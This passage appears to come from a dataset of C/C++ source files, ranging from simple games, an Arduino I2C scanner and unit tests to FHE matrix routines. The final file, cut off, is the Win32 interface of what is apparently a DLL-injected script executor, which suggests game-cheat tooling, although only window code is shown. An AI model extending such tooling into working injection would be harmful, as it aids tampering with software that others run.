dynamic_cast<Animal*>(this);\r\n\t\tanimalPtr->BoostStrenght();\r\n\t}\r\n\tchar type = deffender1->GetType();\r\n\tif (strenght > opponentStrenght || strenght == opponentStrenght)\r\n\t{\r\n\t\tdeffender1->SetToDead();\r\n\t\tif (type == 'A')\r\n\t\t\tinfo.AddToMessages(symbol, def_symbol, 'F');\r\n\t\telse\r\n\t\t\tinfo.AddToMessages(symbol, def_symbol, 'e');\r\n\t}\r\n\telse\r\n\t{\r\n\t\tinfo.AddToMessages(def_symbol, symbol, 'F');\r\n\t\tSetToDead();\r\n\t}\r\n}\r\n\r\nvoid Organism::breeding(int posX, int posY, World& world, InfoTeller& info)\r\n{\r\n\tchar symbol = GetSymbol();\r\n\tOrganism* baby = Baby(&world, &info);\r\n\tfindFreeCellAndSetPos(posX, posY, world, *baby);\r\n\tOrganism* parent = world.FindOrganism(posX, posY);\r\n\tparent->ChangeMoved(false);\r\n\tworld.AddToWait(baby);\r\n\tinfo.AddToMessages(symbol, ' ', 'B');\r\n}\r\n\r\n\r\nint Organism::collision(int posX, int posY, char symbol, World& world, InfoTeller& info)\r\n{\r\n\tchar deffender = world.IsOccupied(posX, posY);\r\n\tif (deffender == ' ')\r\n\t\treturn FREESPACE;\r\n\telse if (symbol == deffender)\t\t\r\n\t{\r\n\t\tbreeding(posX, posY, world, info);\r\n\t\treturn SAMESPECIE;\r\n\t}\r\n\telse\r\n\t\tfight(posX, posY, world,info);\r\n\treturn 5;\r\n}\r\n\r\n\r\nvoid Organism::SetPosition(int x, int y) {\r\n\tpositionX = x;\r\n\tpositionY = y;\r\n}\r\n\r\nvoid Organism::action(int positionX, int positionY, int sizeX, int sizeY,char symbol, World& world, InfoTeller& info)\r\n{\r\n\tint direction = 0;\r\n\tint outcome = 0;\r\n\tint horizontal = 0, vertical = 0;\r\n\twhile(true)\r\n\t{\r\n\t\tdirection = rand() % 4 + 1;\r\n\t\tif (positionX != 0 && positionX + 1 != sizeX && positionY != 0 && positionY + 1 != sizeY)\r\n\t\t\tbreak;\r\n\t\telse if (direction == DOWN && positionX + 1 != sizeX)\r\n\t\t\tbreak;\r\n\t\telse if (direction == UP && positionX != 0)\r\n\t\t\tbreak;\r\n\t\telse if (direction == LEFT && positionY != 0)\r\n\t\t\tbreak;\r\n\t\telse if (direction == RIGHT && positionY + 1 != sizeY)\r\n\t\t\tbreak;\r\n\t}\r\n\r\n\tif (direction == LEFT){\r\n\t\toutcome = collision(positionX, positionY - 1, symbol, world, info);\r\n\t\thorizontal -= 1;\r\n\t}\r\n\telse if( direction == RIGHT){\r\n\t\toutcome = collision(positionX, positionY + 1, symbol, world, info);\r\n\t\thorizontal += 1;\r\n\t}\r\n\telse if (direction == DOWN){\r\n\t\toutcome = collision(positionX + 1, positionY, symbol, world,info);\r\n\t\tvertical += 1;\r\n\t}\r\n\telse{\r\n\t\toutcome = collision(positionX - 1, positionY, symbol, world,info);\r\n\t\tvertical -= 1;\r\n\t}\r\n\r\n\tif ((outcome == FREESPACE || outcome==5) && alive==true)\r\n\t\tSetPosition(positionX + vertical, positionY + horizontal);\r\n\r\n}",
    "#include \"entity-component-system.h\"\n#include <raylib.h>\n#include <vector>\n#include <string>\n#include <string>\n#include <vector>\n\nCoordinator gCoordinator;\n\n// Components\n\nstruct BoardPosition\n{\n    int row;\n    int col;\n};\n\nstruct GridCell\n{\n    // 'X', 'O', or '-'\n    char value;\n    Rectangle rect;\n};\n\nstruct PlayerTurn\n{\n    char symbol;\n};\n\nstruct ResetButton\n{\n    Rectangle rect;\n};\n\n// Enum for game status\nenum class GameStatusEnum\n{\n    PLAYING,\n    DRAW,\n    X_WIN,\n    O_WIN\n};\n\nstruct GameStatus\n{\n    GameStatusEnum status;\n    // array for storing the board\n    std::vector<std::vector<char>> board;\n    std::vector<BoardPosition> winningPositions;\n};\n\nclass GameSystem : public System\n{\nprivate:\n    bool RowWinner(GameStatus &gameStatus, int row)\n    {\n        return gameStatus.board[row][0] == gameStatus.board[row][1] && gameStatus.board[row][1] == gameStatus.board[row][2] && gameStatus.board[row][0] != '-';\n    }\n\n    bool ColumnWinner(GameStatus &gameStatus, int col)\n    {\n        return gameStatus.board[0][col] == gameStatus.board[1][col] && gameStatus.board[1][col] == gameStatus.board[2][col] && gameStatus.board[0][col] != '-';\n    }\n\n    bool ForwardDiagonalWinner(GameStatus &gameStatus)\n    {\n        return gameStatus.board[0][0] == gameStatus.board[1][1] && gameStatus.board[1][1] == gameStatus.board[2][2] && gameStatus.board[0][0] != '-';\n    }\n\n    bool BackwardDiagonalWinner(GameStatus &gameStatus)\n    {\n        return gameStatus.board[0][2] == gameStatus.board[1][1] && gameStatus.board[1][1] == gameStatus.board[2][0] && gameStatus.board[0][2] != '-';\n    }\n\n    bool Draw(GameStatus &gameStatus)\n    {\n        for (int i = 0; i < 3; i++)\n        {\n            for (int j = 0; j < 3; j++)\n            {\n                if (gameStatus.board[i][j] == '-')\n                {\n                    return false;\n                }\n            }\n        }\n\n        return true;\n    }\n\npublic:\n    void Update(Entity game)\n    {\n        auto &gameStatus = gCoordinator.GetComponent<GameStatus>(game);\n        auto &playerTurn = gCoordinator.GetComponent<PlayerTurn>(game);\n\n        // Check for winner\n        for (int i = 0; i < 3; i++)\n        {\n            // @TODO: combine row and column checks.\n            if (RowWinner(gameStatus, i))\n            {\n                gameStatus.status = gameStatus.board[i][0] == 'X' ? GameStatusEnum::X_WIN : GameStatusEnum::O_WIN;\n                gameStatus.winningPositions = {BoardPosition{i, 0}, BoardPosition{i, 1}, BoardPosition{i, 2}};\n            }\n            else if (ColumnWinner(gameStatus, i))\n            {\n                gameStatus.status = gameStatus.board[0][i] == 'X' ? GameStatusEnum::X_WIN : GameStatusEnum::O_WIN;\n                gameStatus.winningPositions = {BoardPosition{0, i}, BoardPosition{1, i}, BoardPosition{2, i}};\n            }\n            else if (ForwardDiagonalWinner(gameStatus))\n            {\n                gameStatus.status = gameStatus.board[0][0] == 'X' ? GameStatusEnum::X_WIN : GameStatusEnum::O_WIN;\n                gameStatus.winningPositions = {BoardPosition{0, 0}, BoardPosition{1, 1}, BoardPosition{2, 2}};\n            }\n            else if (BackwardDiagonalWinner(gameStatus))\n            {\n                gameStatus.status = gameStatus.board[0][2] == 'X' ? GameStatusEnum::X_WIN : GameStatusEnum::O_WIN;\n                gameStatus.winningPositions = {BoardPosition{0, 2}, BoardPosition{1, 1}, BoardPosition{2, 0}};\n            }\n            else if (Draw(gameStatus))\n            {\n                gameStatus.status = GameStatusEnum::DRAW;\n            }\n        }\n    }\n};\n\nclass InputSystem : public System\n{\nprivate:\n    void UpdateGameBoard(Entity game, char symbol, BoardPosition move)\n    {\n        auto &gameStatus = gCoordinator.GetComponent<GameStatus>(game);\n        gameStatus.board[move.row][move.col] = symbol;\n    }\n\n    void CheckCellCollision(Entity game)\n    {\n        auto mousePosition = GetMousePosition();\n        auto gameStatus = gCoordinator.GetComponent<GameStatus>(game);\n        auto &playerTurn = gCoordinator.GetComponent<PlayerTurn>(game);\n\n        for (auto const &entity : mEntities)\n        {\n            auto &cell = gCoordinator.GetComponent<GridCell>(entity);\n            auto &boardPosition = gCoordinator.GetComponent<BoardPosition>(entity);\n\n            if (CheckCollisionPointRec(mousePosition, cell.rect) && IsMouseButtonPressed(MOUSE_LEFT_BUTTON))\n            {\n                if (cell.value == '-')\n                {\n                    cell.value = playerTurn.symbol;\n                    UpdateGameBoard(game, playerTurn.symbol, boardPosition);\n\n                    playerTurn.symbol = playerTurn.symbol == 'X' ? 'O' : 'X';\n                }\n            }\n        }\n    }\n\n    void CheckResetButtonCollision(Entity game)\n    {\n        auto mousePosition = GetMousePosition();\n        auto &resetButton = gCoordinator.GetComponent<ResetButton>(game);\n\n        if (CheckCollisionPointRec(mousePosition, resetButton.rect) && IsMou",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"assignmentfive\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <Arduino.h>\n#include <Wire.h>\n#include \"i2cscan.h\"\n\n/*\nLa funci\u00f3n find_i2c se encarga de buscar todas las direcciones i2c que pueden\nexistir para crear una estructura de tipo I2CScan que indica el total de\ndispositivos y las direcciones de \u00e9stos.\n*/\n\nI2CScan find_i2c (){\n  bool devices[128] = {false};\n  byte error;\n  int nDevices = 0;\n\n  Serial.println(\"Escaneando...\");\n  // Bucle para revisar las direcciones I2C de una en una\n  for(byte address = 1; address < 127; address++ ) {\n    Wire.beginTransmission(address);\n    error = Wire.endTransmission();\n    // Si el c\u00f3digo de error es 0 significa que hay un dispositivo\n    if (error == 0) {\n      Serial.print(\"Dispositivo I2C encontrado en la direcci\u00f3n 0x\");\n      serial_print_address(address);\n      nDevices++;\n      devices[address] = true;\n    }\n    // Si el c\u00f3digo es 4 significa que hay alg\u00fan error desconocido\n    else if (error==4) {\n      Serial.print(\"Error desconocido en la direcci\u00f3n 0x\");\n      serial_print_address(address);\n    }\n  }\n\n  // Indicar si se ha encontrado algo\n  if (nDevices == 0) {\n    Serial.println(\"No se han encontrado dispositivos I2C\\n\");\n  }\n  else {\n    Serial.println(\"Finalizado\");\n  }\n\n  // Pasar los datos encontrados (si los hay) a una estructura de datos\n  I2CScan result;\n  result.total = nDevices;\n  if (nDevices != 0){\n    result.devices = new int[nDevices];\n    int index = 0;\n    for (int i = 1; i < 127; i++){\n      if (devices[i]){\n        result.devices[index] = i;\n        index++;\n      }\n    }\n  }\n  return result;\n}\n\n\n/*\nLa funci\u00f3n serial_print_address sirve para pasar por puerto serie un n\u00famero\nen formato decimal a formato hexadecimal de 2 d\u00edgitos (e.g: 15 -> 0F, 17 -> 12).\nSe recomienda haber enviado antes el '0x'\n*/\n\nvoid serial_print_address (int address){\n  if (address<16) {\n    Serial.print(\"0\");\n  }\n  Serial.println(address, HEX);\n}\n\n/*\nLa funci\u00f3n realiza_escaneo_i2c sirve para ejecutar la funci\u00f3n find_i2c y enviar\nlos resultados al puerto serie. B\u00e1sicamente es para hacer un test y ver qu\u00e9\nse detecta.\n*/\n\nvoid realiza_escaneo_i2c (){\n  I2CScan i2c;\n  i2c = find_i2c ();\n  Serial.print(\"Se ha(n) encontrado un total de \");\n  Serial.print(i2c.total);\n  Serial.println(\" dispositivo(s).\");\n  if (i2c.total != 0){\n    for (int i = 0; i < i2c.total; i++){\n      Serial.print(\"Dispositivo encontrado en 0x\");\n      serial_print_address (i2c.devices[i]);\n    }\n  }\n}",
    "#include <gtest/gtest.h>\n#include <stdexcept>\n#include \"Account.h\"\n#include \"Transaction.h\"\n#include <gmock/gmock.h>\n\nclass MockAccount : public Account {\n private:\n  int id;\n  int balance;\n public:\n  MockAccount(int id, int balance) : Account(id, balance) {}\n  MOCK_METHOD(int, GetBalance, (), (const, override));\n  MOCK_METHOD(void, ChangeBalance, (int), (override));\n  MOCK_METHOD(void, Lock, (), (override));\n  MOCK_METHOD(void, Unlock, (), (override));\n};\n\nclass MockTransaction : public Transaction {\n public:\n  MockTransaction() : Transaction() {}\n  MOCK_METHOD(void, SaveToDataBase, (Account& from, Account& to, int sum), (override));\n};\n\nusing ::testing::AtLeast;\n\nTEST(Account, Mock) {\n  MockAccount ac1(1, 1000);\n  EXPECT_CALL(ac1, GetBalance()).Times(AtLeast(1));\n  std::cout <<  ac1.GetBalance() << std::endl;\n  EXPECT_CALL(ac1, Lock()).Times(AtLeast(1));\n  ac1.Lock();\n  EXPECT_CALL(ac1, ChangeBalance(1)).Times(AtLeast(1));\n  ac1.ChangeBalance(1);\n  EXPECT_CALL(ac1, Unlock()).Times(AtLeast(1));\n  ac1.Unlock();\n  \n}\n\nTEST(Transaction, Mock) {\n  Account ac1(1, 10000);\n  Account ac2(2, 10000);\n  MockTransaction t1;\n  EXPECT_CALL(t1, SaveToDataBase(ac1, ac2, 1999)).Times(AtLeast(1));\n  t1.Make(ac1, ac2, 1999);\n  \n  \n}\n\nTEST(Account, Methods) {\n  Account ac1(1, 1000);\n  EXPECT_EQ(1000, ac1.GetBalance());\n  ac1.Lock();\n  ac1.ChangeBalance(2000);\n  ac1.Unlock();\n  EXPECT_EQ(3000, ac1.GetBalance());\n  try {\n    ac1.ChangeBalance(1);\n  }\n  catch (std::runtime_error& el) {}\n  EXPECT_EQ(3000, ac1.GetBalance());\n}\n\nTEST(Transaction, Methods) {\n  Account ac1(1, 10000);\n  Account ac2(2, 10000);\n  Transaction t1;\n  Transaction t2; t2.set_fee(500);\n  try {t1.Make(ac1, ac1, 100); EXPECT_EQ(1, 0);}\n  catch (std::logic_error& el) {}\n  try {t1.Make(ac1, ac2, -100); EXPECT_EQ(1, 0);}\n  catch (std::invalid_argument& el) {}\n  try {t1.Make(ac1, ac2, 0); EXPECT_EQ(1, 0);}\n  catch (std::logic_error& el) {}\n  EXPECT_EQ(false, t2.Make(ac1, ac2, 200));\n  t1.Make(ac1, ac2, 1999);\n  EXPECT_EQ(ac1.GetBalance(), 8000); EXPECT_EQ(ac2.GetBalance(), 11999);\n}\n",
    "#include \"Base.h\"\n#include <cstring>\n\nBase::Base() : capacity(1), count(0)\n{\n    pBase = new Pair[this->capacity];\n\n}\n\nBase::~Base()\n{\n\n\tdelete[] this->pBase;\n\tthis->pBase = nullptr;\n\n}\n\nBase::Base(const Base& bd): pBase(new Pair[bd.capacity]), count(bd.count), capacity(bd.capacity) \n{\n\tif(bd.count > 0) {\n\t\t\n\t\t\tstd::copy(bd.pBase, bd.pBase + bd.count, pBase);\n\t\t\n\t}\n\n}\n\nBase::Base(Base&& bd) noexcept \n{\n\n\tcount = bd.count;\n\tpBase = bd.pBase;\n\tcapacity = bd.capacity;\n\tbd.pBase = nullptr;\n\n}\n\nBase& Base::operator=(Base&& bd) noexcept\n{\n\tif (this == &bd) \n\t{\n\t\treturn *this;\n\t}\n\n\tPair* tmp = pBase;\n\tcount = bd.count;\n\tcapacity = bd.capacity;\n\tpBase = bd.pBase;\n\tbd.pBase = tmp;\n\tbd.pBase = nullptr;\n\treturn *this;\n}\n\nBase& Base::operator =(const Base& bd)\n{\n\tif (this == &bd)\n\t{\n\t\treturn *this;\n\t}\n\n\tthis->capacity = bd.capacity;\n\tthis->count = bd.count;\n\n\tfor (int i = 0; i < bd.count; i++)\n\t{\n\t\tthis->pBase[i] = bd.pBase[i];\n\t}\n\n\treturn *this;\n\n}\n\nMyData& Base::operator[](const char* key)\n\n{\n\tfor (int i = 0; i < this->count; i++) \n\t{\n\t\tif (strcmp(pBase[i].Key.GetString(), key) == 0)\n\t\t{\n\t\t\treturn pBase[i].data_m;\n\t\t}\n\t}\n\tif (this->count >= this->capacity)\n\t{\n\t\tthis->capacity *= 3;\n\t\tPair* NewArray = new Pair[this->capacity];\n\t\tfor (int i = 0; i < this->count; i++)\n\t\t{\n\t\t\tNewArray[i] = pBase[i];\n\t\t}\n\t\tdelete[] pBase;\n\t\tpBase = NewArray;\n\t\tNewArray = nullptr;\n\t}\n\n\tpBase[count].Key = key;\n\n\tcount++;\n\n\treturn pBase[count - 1].data_m;\n}\n\nstd::ostream& operator<< (std::ostream& examp, Base& bd)\n{\n\tif (bd.count == 0) \n\t{\n\t\tstd::cout << \"Your database is empty!!!\\n\";\n\t\treturn examp;\n\t}\n\n\tfor (int i = 0; i < bd.count; i++) \n\t{\n\n\t\texamp << \"\u2116 \" << i + 1 << std::endl;\n\t\texamp << \"Full Name: \";\n\t\texamp << bd.pBase[i].ReturnKey() << std::endl;\n\t\texamp << \"Gender: \";\n\t\texamp << bd.pBase[i].Returndata_m().Return_Sex() << std::endl;\n\t\texamp << \"Age: \";\n\t\texamp << bd.pBase[i].Returndata_m().Return_m_age() << std::endl;\n\t\texamp << \"Job: \";\n\t\texamp << bd.pBase[i].Returndata_m().Return_m_job().GetString() << std::endl;\n\t\texamp << \"Salary: \";\n\t\texamp << bd.pBase[i].Returndata_m().Return_m_salary() << std::endl << std::endl;\n\n\t}\n\n\treturn examp;\n\n}\n\nint Base::DeletePair(const char* key) \n{\n\tbool True_Key = false;\n\n\tfor (int i = 0; i < this->count; i++) \n\t{\n\t\tif (strcmp(pBase[i].Key.m_pStr, key) == 0)\n\t\t{\n\t\t\tTrue_Key = true;\n\t\t\treturn i;\n\t\t}\n\t}\n\tif (True_Key == false)\n\t{\n\n\t\treturn -2;\n\t}\n\n\treturn 0;\n\n}\n\nbool Base::CheckName(const char* ptr) \n{\n\tfor (size_t i = 0; i < count; i++)\n\t{\n\t\tif (strcmp(pBase[i].Key.m_pStr, ptr) == 0)\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t}\n\n\treturn false;\n\n}\n",
    "\n#include \"FHE/Matrix.h\"\n#include \"Tools/Exceptions.h\"\n\n#include \"Math/modp.hpp\"\n\n#include <stdlib.h>\n#include <iostream>\n\nusing namespace std;\n\nvoid ident(matrix& U,int n)\n{\n  U.resize(n, vector<bigint>(n) );\n  for (int i=0; i<n; i++)\n    { for (int j=0; j<n; j++)\n        { U[i][j]=0; }\n      U[i][i]=1;\n    }\n}\n\n\nvoid ident(imatrix& U,int n)\n{\n  U.resize(n, imatrix::value_type(n));\n  for (int i=0; i<n; i++)\n    { for (int j=0; j<n; j++)\n        { U[i][j]=0; }\n      U[i][i]=1;\n    }\n}\n\n\n\n\nmatrix transpose(const matrix& A)\n{\n  int m=A.size(),n=A[0].size();\n  matrix B(n, vector<bigint>(m) );\n  for (int i=0; i<m; i++)\n    { for (int j=0; j<n; j++)\n        { B[j][i]=A[i][j]; }\n    }\n  return B;\n}\n\n\nmatrix Mul(const matrix& A,const matrix& B)\n{\n  unsigned int m=A.size(),n=B[0].size(),t=A[0].size();\n  if (t!=B.size()) { throw invalid_length(); }\n  matrix C(m, vector<bigint>(n) );\n  for (unsigned int i=0; i<m; i++)\n    { for (unsigned int j=0; j<n; j++)\n\t{ C[i][j]=0;\n          for (unsigned int k=0; k<t; k++)\n\t    { C[i][j]+=A[i][k]*B[k][j]; }\n        }\n    }\n  return C;\n}\n\n\n/* Uses Algorithm 2.7 from Pohst-Zassenhaus to compute H and U st\n\t\tH = HNF(A) = A*U\n*/\nvoid HNF(matrix& H,matrix& U,const matrix& A)\n{\n  int m=A.size(),n=A[0].size(),r,i,j,k;\n  \n#ifdef VERBOSE\n  cerr << \"HNF m=\" << m << \", n=\" << n << endl;\n#endif\n\n  H=A;\n  ident(U,n);\n  r=min(m,n);\n  i=0;\n  bool flag=true;\n  bigint mn,te;\n  int step=2;\n  while (flag)\n    { if (step==2)\n        { // Step 2\n          k=-1;\n          mn=bigint(0);\n          for (j=i; j<n; j++)\n\t    { if (H[i][j]!=0 && (abs(H[i][j])<mn || mn == 0))\n\t        { k=j; mn=abs(H[i][j]); }\n            }\n          if (k!=-1)\n\t    { if (k!=i)\n\t        { // Step 3\n                  for (j=0; j<m; j++)\n\t\t    { te=H[j][i]; H[j][i]=H[j][k]; H[j][k]=te; }\n                  for (j=0; j<n; j++)\n                    { te=U[j][i]; U[j][i]=U[j][k]; U[j][k]=te; }\n\t        }\n\t      // Step 4\n              bool fl=true;\n              for (j=i+1; j<n; j++)\n\t        { te=H[i][j]/H[i][i];\n                  if (abs(H[i][j]%H[i][i])>abs(H[i][i]/2)) { te=te+1; }\n                  /*\n\t\t  cout << i << \" \" << j << \" : \" ;\n                  cout << H[i][j] << \" \" << H[i][i] << \" \" << te << endl;\n                  */\n                  for (k=0; k<m; k++) { H[k][j]=H[k][j]-te*H[k][i]; }\n                  for (k=0; k<n; k++) { U[k][j]=U[k][j]-te*U[k][i]; }\n\t          if (H[i][j]!=0) { fl=false; }\n                }\n\t      if (fl==true) { step=5; }\n            }\n\t }\n       \n       if (step==5)\n         { // Step 5 \n\t   if (H[i][i]<0) \n\t      { for (k=0; k<m; k++) { H[k][i]=-H[k][i]; }\n\t        for (k=0; k<n; k++) { U[k][i]=-U[k][i]; }\n\t      }\n\t   for (j=0; j<i; j++)\n\t      { te=(H[i][j]/H[i][i]);\n                for (k=0; k<m; k++) { H[k][j]=H[k][j]-te*H[k][i]; }\n                for (k=0; k<n; k++) { U[k][j]=U[k][j]-te*U[k][i]; }\n              }\n\t    step=6;\n          }\n        if (step==6)\n\t  { if (i==(r-1)) \n\t       { flag=false; }\n             else     \n\t       { i=i+1;\n                 if (i==(r-1)) { step=2; }\n                 else          { step=2; }\n\t       }\n\t }\n\t//cout << i << \" \" << step << \"\\n\" << H << endl;\n    }\n}\n\n\nbool IsDiag(const matrix& A)\n{\n  int i,j,r=A.size(),c=A[0].size();\n  for (i=0; i<r; i++)\n    { for (j=0; j<c; j++)\n        { if (i!=j && A[i][j]!=0) { return false; } }\n    }\n  return true;\n}\n\nbool IsIdent(const matrix& A)\n{\n  unsigned int i,j,r=A.size();\n  if (A[0].size()!=r) { throw bad_value(); }\n  for (i=0; i<r; i++)\n    { for (j=0; j<r; j++)\n        { if (i!=j && A[i][j]!=0) { return false; } }\n      if (A[i][i]!=1) { return false; } \n    }\n  return true;\n}\n\n\nvoid print(const matrix& S)\n{\n  int m=S.size(),n=S[0].size();\n  for (int i=0; i<m; i++)\n    { for (int j=0; j<n; j++)\n\t{ cout << S[i][j] << \" \"; }\n      cout << endl;\n    }\n}\n\n\nvoid print(const imatrix& S)\n{\n  int m=S.size(),n=S[0].size();\n  for (int i=0; i<m; i++)\n    { for (int j=0; j<n; j++)\n        { cout << S[i][j] << \" \"; }\n      cout << endl;\n    }\n}\n\n\nvoid SNF_Step(matrix& S,matrix& V)\n{ \n  //cout << \"Entering SNF_Step \" << endl;\n  //print(S); cout << endl; print(V);\n  int m=S.size();\n  matrix U2,V2;\n  while (!IsDiag(S))\n    { //cout << \"\\n\\nColumn Reducing...\\n\";\n      HNF(S,V2,S);\n      S=transpose(S);\n      V=Mul(V,V2);\n      //cout << \"\\n\\nRow Reducing...\\n\";\n      ident(U2,m);\n      HNF(S,U2,S);\n      S=transpose(S);\n      //cout << \"Step \"  << endl;\n      //print(S); cout << endl; print(V);\n    }\n}\n  \n\n\n// S = U*A*V\nvoid SNF(matrix& S,const matrix& A,matrix& V)\n{\n  int m=A.size(),n=A[0].size();\n\n#ifdef VERBOSE\n  cerr << \"SNF m=\" << m << \", n=\" << n << endl;\n#endif\n\n  S=A;\n  ident(V,n);\n\n  /* First get a diagonal matrix using the HNF */\n  matrix U2,V2;\n  SNF_Step(S,V); \n\n  /* Now get the divisibility condition */\n  int i,r;\n  r=min(m,n);\n  for (i=0; i<r-1; i++)\n    { if ((S[i+1][i+1]%S[i][i])!=0)\n\t{ // Add row i+1 to row i\n\t  S[i][i+1]=S[i+1][i+1];\n          SNF_Step(S,V);\n\t}\n    }\n}\n\n\n\n// Special inverse routine\nmat",
    "// This project is by  0tff and toasty! Good luck \n// Have a look into the wiki!\n\n#define _CRT_SECURE_NO_WARNINGS \n#include <Windows.h>\n#include <iostream>\n#include <string>\n#include <vector>\n#include <sstream>\n#include <iterator>\n#include <string.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nusing namespace std;\n\nvoid init();\nvoid ShowWindowForm();\n\nvoid Print(HWND hWndEdit, std::string pszText)\n{\n    int nLength = GetWindowTextLength(hWndEdit);\n    SendMessage(hWndEdit, EM_SETSEL, (WPARAM)nLength, (LPARAM)nLength);\n    SendMessage(hWndEdit, EM_REPLACESEL, (WPARAM)FALSE, (LPARAM)pszText.c_str());\n}\n\n#define INPUT_CHAR_LIMIT            500\n\n#define ALX_CONSOLE_WINDOW     (WM_APP + 500)\n#define ALX_INPUT_FIELD        (WM_APP + 501)\n\n#define MALX_EXIT              (WM_APP + 600)\n#define MALX_RESTART           (WM_APP + 601)\n#define MALX_ABOUT             (WM_APP + 602)\n#define MALX_CREDITS           (WM_APP + 603)\n#define MALX_COMMANDS          (WM_APP + 604)\n\nHWND ParentWindow = NULL;\nHWND MainWindow = NULL;\nHMENU WindowMenu = NULL;\nHMODULE HInstance = NULL;\n\nHWND InputField = NULL;\nHWND txtbox = NULL;\n\nLRESULT CALLBACK DLLWindowProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    switch (message)\n    {\n    case WM_CTLCOLORSTATIC:\n    {\n        HDC hEdit = (HDC)wParam;\n        SetTextColor(hEdit, RGB(255, 255, 255));\n        SetBkColor(hEdit, RGB(34, 34, 34)); // Dark background color\n        return (LRESULT)GetStockObject(BLACK_BRUSH);\n    }\n    case WM_COMMAND:\n        switch (LOWORD(wParam))\n        {\n        case MALX_EXIT:\n            if (MessageBox(hwnd, \"Are you sure you want to exit?\", \"Exit\", MB_YESNOCANCEL) == IDYES)\n                ExitThread(0);\n            break;\n        }\n        break;\n    case WM_DESTROY:\n        ExitThread(0);\n        break;\n    case WM_QUIT:\n        ExitThread(0);\n        break;\n    default:\n        return DefWindowProc(hwnd, message, wParam, lParam);\n    }\n    return 0;\n}\n\nBOOL RegisterWindowClass(const char* wClassName) {\n    WNDCLASSEX nClass;\n\n    nClass.cbSize = sizeof(WNDCLASSEX);\n    nClass.style = CS_DBLCLKS;\n    nClass.lpfnWndProc = DLLWindowProc;\n    nClass.cbClsExtra = 0;\n    nClass.cbWndExtra = 0;\n    nClass.hInstance = GetModuleHandle(NULL);\n    nClass.hIcon = LoadIcon(NULL, IDI_APPLICATION); \n    nClass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);\n    nClass.hCursor = LoadCursor(NULL, IDC_ARROW);\n    nClass.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH); // Set background to a ninja xd\n    nClass.lpszMenuName = \"what\";\n    nClass.lpszClassName = wClassName;\n\n    if (!RegisterClassEx(&nClass))\n        return 0;\n\n    return 1;\n}\n\nBOOL StartMessageLoop() {\n    MSG msg;\n    BOOL bRet;\n\n    while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0)\n    {\n        if (bRet == 0) {\n            return 0;\n        }\n        else if (bRet == -1)\n        {\n            return 0;\n        }\n        else\n        {\n            TranslateMessage(&msg);\n            DispatchMessage(&msg);\n        }\n    }\n}\n\nBOOL CreateSubwindows() {\n    txtbox = CreateWindowEx(NULL, \"EDIT\", \"\", WS_CHILD | WS_BORDER | WS_VSCROLL | ES_MULTILINE | WS_VISIBLE | ES_READONLY | ES_AUTOVSCROLL, 1, 20, 450, 234, MainWindow, (HMENU)ALX_CONSOLE_WINDOW, HInstance, 0);\n    InputField = CreateWindowEx(NULL, \"EDIT\", \"\", WS_CHILD | WS_BORDER | ES_MULTILINE | WS_VISIBLE, 1, 284, 420, 100, MainWindow, (HMENU)ALX_INPUT_FIELD, HInstance, 0);\n    HWND execute = CreateWindowEx(NULL, \"button\", \"Execute\", WS_CHILD | WS_VISIBLE | WS_BORDER, 1, 253, 100, 32, MainWindow, NULL, NULL, NULL);\n    HWND openfile = CreateWindowEx(NULL, \"button\", \"Open file\", WS_CHILD | WS_VISIBLE | WS_BORDER, 100, 253, 220, 32, MainWindow, NULL, NULL, NULL);\n    HWND clear = CreateWindowEx(NULL, \"button\", \"Clear\", WS_CHILD | WS_VISIBLE | WS_BORDER, 320, 253, 100, 32, MainWindow, NULL, NULL, NULL);\n\n    SendMessage(InputField, EM_SETLIMITTEXT, INPUT_CHAR_LIMIT, NULL);\n\n    HFONT textFont = CreateFont(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, TEXT(\"Segoe UI\"));\n\n    SendMessage(txtbox, WM_SETFONT, (WPARAM)textFont, MAKELPARAM(TRUE, 0));\n    SendMessage(InputField, WM_SETFONT, (WPARAM)textFont, MAKELPARAM(TRUE, 0));\n\n    UpdateWindow(MainWindow);\n\n    return 1;\n}\n\nBOOL CreateWindowMenu() {\n    WindowMenu = CreateMenu();\n    if (!WindowMenu)\n        return 0;\n\n    HMENU mainDropdown = CreatePopupMenu();\n    AppendMenu(mainDropdown, MF_STRING, MALX_EXIT, \"Exit\");\n    AppendMenu(WindowMenu, MF_POPUP, (UINT_PTR)mainDropdown, \" SimpleUi\");\n\n    HMENU aboutDropdown = CreatePopupMenu();\n    AppendMenu(aboutDropdown, MF_STRING, MALX_CREDITS, \"Credits\");\n    AppendMenu(aboutDropdown, MF_STRING, MALX_ABOUT, \"Large script window\");\n    AppendMenu(WindowMenu, MF_POPUP, (UINT_PTR)aboutDropdown, \"View\");\n\n    return 1;\n}\n\nBOOL InitiateWindow() {\n    HInstance = GetModuleHandle(NULL);\n\n    UnregisterClass(\"ALX_WINDOW\", HInstance);\n    